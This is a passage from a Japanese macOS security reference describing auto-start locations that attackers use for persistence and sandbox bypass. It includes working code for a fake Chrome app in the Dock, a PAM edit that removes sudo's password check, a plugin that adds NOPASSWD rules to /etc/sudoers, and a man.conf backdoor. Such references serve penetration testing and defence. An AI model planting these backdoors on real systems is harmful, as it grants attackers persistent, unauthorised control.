ファイル名には、queue、job number、スケジュールされた実行時刻が含まれています。例として `a0001a019bdcd2` を見てみましょう。

- `a` - queue
- `0001a` - 16進数のjob number、`0x1a = 26`
- `019bdcd2` - 16進数の時刻。epochから経過した分数を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` となり、`GMT: 2021年4月27日、火曜日 7:46:00` です。

job fileを出力すると、`at -c` を使って取得したものと同じ情報が含まれていることがわかります。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Folder Actionsを設定するには、引数付きで `osascript` を呼び出して **`System Events`** に接続できる必要があります
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop、Documents、Downloadsなどの基本的なTCC permissionsがあります

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Rootが必要
- **Trigger**: 指定したfolderへのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 指定したfolderへのアクセス

#### Description & Exploitation

Folder Actionsは、項目の追加や削除、folder windowの開閉やサイズ変更など、folder内の変更によって自動的にtriggerされるscriptです。これらのactionsはさまざまなタスクに利用でき、Finder UIやterminal commandsなど、複数の方法でtriggerできます。<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actionsを設定するには、次のような方法があります。

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)でFolder Action workflowを作成し、serviceとしてインストールする。
2. folderのcontext menuにあるFolder Actions Setupから、scriptを手動で関連付ける。
3. OSAScriptを使用して`System Events.app`にApple Event messagesを送信し、Folder Actionをプログラムで設定する。
- この方法は、actionをsystemに組み込む場合に特に有用で、一定のpersistenceを提供します。

次のscriptは、Folder Actionによって実行できる内容の例です。
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
上記のスクリプトを Folder Actions で使用できるようにするには、次のコマンドを使用してコンパイルします:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトをコンパイルしたら、以下のスクリプトを実行してFolder Actionsを設定します。このスクリプトにより、Folder Actionsがグローバルに有効化され、以前コンパイルしたスクリプトがDesktopフォルダに明示的に関連付けられます。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
次のコマンドでセットアップスクリプトを実行します:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- GUIを介してこのpersistenceを実装する方法は次のとおりです。

実行されるscriptは次のとおりです：
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
これを使ってコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、`Folder Actions Setup` appを開き、**監視したいフォルダー**を選択し、ケースに応じて **`folder.scpt`** を選択します（私の場合は output2.scp という名前にしました）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder**でそのフォルダーを開くと、スクリプトが実行されます。

この設定は、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** にある **plist** にbase64形式で保存されました。

それでは、GUIアクセスなしでこの永続化を準備してみましょう：

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** をバックアップのために `/tmp` へコピーします：
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したFolder Actionsを削除します：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで空の環境が用意できました。

3. バックアップファイルをコピーします：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Folder Actions Setup.appを開いて、この設定を読み込ませます：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> しかし、私の場合はこれで動作しませんでした。以下はwriteupに記載されていた手順です:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、malicious applicationをシステム内にインストールしておく必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: ユーザーがDock内のappをクリックしたとき

#### Description & Exploitation

Dockに表示されるすべてのappはplist内で指定されています：**`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

次のようにして、**applicationを追加**できます：
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
**social engineering**を使えば、Dock内で**Google Chrome**などになりすまし、実際に自分のスクリプトを実行させることができます：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 非常に特定のアクションが発生する必要がある
- 別の sandbox に移行する
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root が必要
- Trigger: Color Picker を使用する
- `~/Library/ColorPickers`
- Trigger: Color Picker を使用する

#### Description & Exploit

コードを含む **color picker** bundle を **Compile** し（例として [**こちら**](https://github.com/viktorstrate/color-picker-plus) を使用できます）、constructor（[Screen Saver セクション](macos-auto-start-locations.md#screen-saver)の例）を追加して、bundle を `~/Library/ColorPickers` にコピーします。<sup>[[20]](#references)</sup>

その後、Color Picker が Trigger されると、あなたのコードも同様に実行されます。

なお、library を loading する binary には、**非常に制限の厳しい sandbox** があります: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- sandbox の bypass に有用: **いいえ。自分の app を実行する必要があるため**
- TCC bypass: ???

#### 場所

- 特定の app

#### 説明と Exploit

Finder Sync Extension を含む application の例は[こちらにあります](https://github.com/D00MFist/InSync)。

Application には `Finder Sync Extensions` を持たせることができます。この extension は実行される application 内に配置されます。さらに、extension がその code を実行するには、**有効な Apple developer certificate で署名されていること**、**sandbox 化されていること**（ただし、relaxed exceptions を追加することは可能です）、そして次のようなものに登録されていることが**必須**です:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には一般的なアプリケーション sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/System/Library/Screen Savers`
- root が必要
- **Trigger**: スクリーンセーバーを選択
- `/Library/Screen Savers`
- root が必要
- **Trigger**: スクリーンセーバーを選択
- `~/Library/Screen Savers`
- **Trigger**: スクリーンセーバーを選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明と Exploit

Xcode で新しいプロジェクトを作成し、テンプレートを選択して新しい **スクリーンセーバー** を生成します。次に、コードを追加します。例えば、以下のコードでログを生成できます。<sup>[[23]](#references)[[24]](#references)</sup>

**ビルド**し、`.saver` bundle を **`~/Library/Screen Savers`** にコピーします。次に、スクリーンセーバーの GUI を開いてクリックするだけで、多数のログが生成されるはずです。
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> このコードをロードするバイナリ（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）の entitlements 内に **`com.apple.security.app-sandbox`** が含まれているため、**common application sandbox** 内で実行されることに注意してください。

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には application sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox は非常に制限されているように見える

#### Location

- `~/Library/Spotlight/`
- **Trigger**: spotlight plugin が管理する拡張子の新しいファイルが作成される。
- `/Library/Spotlight/`
- **Trigger**: spotlight plugin が管理する拡張子の新しいファイルが作成される。
- root が必要
- `/System/Library/Spotlight/`
- **Trigger**: spotlight plugin が管理する拡張子の新しいファイルが作成される。
- root が必要
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: spotlight plugin が管理する拡張子の新しいファイルが作成される。
- 新しい app が必要

#### Description & Exploitation

Spotlight は macOS に組み込まれた search feature であり、ユーザーが**コンピューター上のデータに迅速かつ包括的にアクセスできるように**設計されています。\
この高速な検索機能を実現するため、Spotlight は**独自の database**を保持し、**ほとんどのファイルを解析**して index を作成します。これにより、ファイル名とその内容の両方を迅速に検索できます。<sup>[[25]](#references)</sup>

Spotlight の基盤となる仕組みには、'mds' という名前の central process があり、これは **'metadata server'** を意味します。この process が Spotlight service 全体を統括します。これを補完する形で、複数の 'mdworker' daemon が、さまざまな file type の indexing など、多様な maintenance task を実行します（`ps -ef | grep mdworker`）。これらの task は Spotlight importer plugin、すなわち **".mdimporter bundles**" によって可能になります。これにより Spotlight は、さまざまな file format の content を認識して index 化できます。

plugin または **`.mdimporter`** bundle は前述の場所に配置され、新しい bundle が出現すると 1 分以内に load されます（service の restart は不要です）。これらの bundle では、**管理できる file type と拡張子**を指定する必要があります。これにより、指定された拡張子を持つ新しいファイルが作成されたとき、Spotlight はそれらを使用します。

現在 load されている **すべての `mdimporter`** は、次のコマンドを実行して確認できます：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
そして例えば **/Library/Spotlight/iBooksAuthor.mdimporter** は、これらの種類のファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** エントリが見つからない場合があります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、System のデフォルトプラグインが常に優先されるため、攻撃者がアクセスできるのは、Apple 独自の `mdimporters` によってインデックス化されていないファイルだけです。

独自の importer を作成するには、まずこのプロジェクトを利用します: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)。その後、名前と **`CFBundleDocumentTypes`** を変更し、**`UTImportedTypeDeclarations`** を追加して、サポートしたい拡張子に対応させ、**`schema.xml`** にも反映します。\
次に、関数 **`GetMetadataForFile`** のコードを変更し、対象の拡張子を持つファイルが作成されたときに payload を実行するようにします。

最後に、**新しい `.mdimporter` を build して**先ほどの3つの場所のいずれかにコピーします。**ログを monitoring する**か、**`mdimport -L.`** を確認することで、ロードされたかどうかを確認できます。

### ~~Preference Pane~~

> [!CAUTION]
> これはもう動作していないようです。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 特定のユーザーアクションが必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

これはもう動作していないようです。<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass** に有用な start locations を紹介します。これにより、**root** でファイルに書き込むだけで何かを実行できたり、その他の **奇妙な条件が必要だったりします。**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- root が必要
- **Trigger**: 時刻になるとき
- `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
- root が必要
- **Trigger**: 時刻になるとき

#### Description & Exploitation

Periodic scripts（**`/etc/periodic`**）は、**`/System/Library/LaunchDaemons/com.apple.periodic*`** に設定された **launch daemons** によって実行されます。`/etc/periodic/` に保存された scripts は **ファイルの owner として実行される**ため、これは潜在的な privilege escalation には利用できない点に注意してください。<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** に、実行されるその他の定期スクリプトが記載されています。
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`、`/etc/weekly.local`、または`/etc/monthly.local`のいずれかのファイルを書き込める場合、それは**遅かれ早かれ実行されます**。

> [!WARNING]
> periodic scriptは、**そのscriptのownerとして実行される**ことに注意してください。したがって、通常のuserがscriptを所有している場合、そのuserとして実行されます（これによりprivilege escalation攻撃が防止される可能性があります）。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- sandboxのbypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただしrootである必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 常にrootが必要

#### Description & Exploitation

PAMはmacOS内での容易な実行よりも**persistence**やmalwareに重点を置いているため、このblogでは詳しい説明は行いません。**このtechniqueをより深く理解するには、writeupを読んでください**。<sup>[[28]](#references)</sup>

以下でPAM modulesを確認します。
```bash
ls -l /etc/pam.d
```
PAMを悪用した persistence/privilege escalation technique は、モジュール /etc/pam.d/sudo を変更して、先頭に次の行を追加するだけで実行できます。
```bash
auth       sufficient     pam_permit.so
```
そのため、次のように**見えます**：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
そして、**`sudo` を使用しようとする試みはすべて機能します**。

> [!CAUTION]
> このディレクトリは TCC によって保護されているため、ユーザーにアクセス許可を求める prompt が表示される可能性が非常に高いことに注意してください。

もう 1 つのよい例は su です。ここでは、PAM modules に parameters を渡すことも可能であることがわかります（この file に backdoor を仕込むこともできます）。
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root 権限を取得し、追加の config を行う必要がある
- TCC bypass: ???

#### 場所

- `/Library/Security/SecurityAgentPlugins/`
- root 権限が必要
- plugin を使用するよう authorization database を設定する必要もある

#### 説明と Exploitation

ユーザーのログイン時に実行される authorization plugin を作成し、persistence を維持できます。これらの plugin の作成方法については、以前の Writeup を確認してください（ただし、適切に記述されていない plugin によってログインできなくなる可能性があり、その場合は Recovery Mode から Mac を修復する必要があるため注意してください）。<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**移動**: バンドルをロード先に配置します。
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、この**Plugin**をロードするための**rule**を追加します：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** は、認証フレームワークに対して、**認可のために外部メカニズムを呼び出す必要がある**ことを伝えます。さらに、**`privileged`** によって root として実行されます。

次のようにトリガーします：
```bash
security authorize com.asdf.asdf
```
そして **staff group には sudo** access が必要です（確認するには `/etc/sudoers` を読み取ります）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、user が man を使用しなければならない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- root required
- **`/private/etc/man.conf`**: man が使用されるたび

#### Description & Exploit

config file **`/private/etc/man.conf`** は、man の documentation files を開く際に使用する binary/script を指定します。そのため、executable への path を変更すると、user が man を使用してドキュメントを読むたびに backdoor が実行されます。<sup>[[31]](#references)</sup>

例えば **`/private/etc/man.conf`** に次のように設定します。
```
MANPAGER /tmp/view
```
そして、`/tmp/view` を次のように作成します：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、apache が実行中である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd には entitlements がありません

#### Location

- **`/etc/apache2/httpd.conf`**
- root が必要
- トリガー: Apache2 の起動時

#### Description & Exploit

`/etc/apache2/httpd.conf` に、次のような行を追加して module をロードするよう指定できます:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
この方法で、コンパイルしたモジュールが Apache によってロードされます。必要なのは、**有効な Apple certificate で署名する**か、システムに**新しい trusted certificate を追加して、それで署名する**ことだけです。

その後、必要であれば、server が起動されることを確認するために、次を実行します。
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylbのコード例:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root 権限が必要で、auditd が実行中であり、warning を発生させる必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/etc/security/audit_warn`**
- root 権限が必要
- **Trigger**: auditd が warning を検出したとき

#### 説明と Exploit

auditd が warning を検出するたびに、スクリプト **`/etc/security/audit_warn`** が **実行**されます。そのため、そこに payload を追加できます。<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **これは deprecated なので、これらのディレクトリには何も見つからないはずです。**

**StartupItem** は、`/Library/StartupItems/` または `/System/Library/StartupItems/` のいずれかに配置されるディレクトリです。このディレクトリを作成したら、次の2つのファイルを含める必要があります。

1. **rc script**: 起動時に実行される shell script。
2. **plist file**: `StartupParameters.plist` という名前で、さまざまな設定を含むファイル。

startup process がこれらを認識して使用できるように、rc script と `StartupParameters.plist` file の両方を **StartupItem** directory 内に正しく配置してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 私の macOS ではこのコンポーネントを見つけられないため、詳細については writeup を確認してください

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple によって導入された **emond** は、開発が十分でない、または放棄された可能性があるように見える logging mechanism ですが、現在もアクセス可能です。Mac administrator にとって特に有益ではない一方で、このあまり知られていない service は、ほとんどの macOS admins に気付かれない可能性が高く、threat actors にとって目立たない persistence method として利用される可能性があります。<sup>[[34]](#references)</sup>

その存在を知っている人にとって、**emond** の悪意ある使用を特定するのは簡単です。この service の system の LaunchDaemon は、単一の directory 内で実行する scripts を探します。これを確認するには、次の command を使用できます：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 場所

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- root 必須
- **トリガー**: XQuartz 使用時

#### 説明と Exploit

XQuartz は **macOS にすでにインストールされていない**ため、詳細については writeup を確認してください。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> root であっても kext のインストールは非常に複雑なため、exploit がない限り、サンドボックスからの脱出や persistence には使用できないものと考えます。

#### 場所

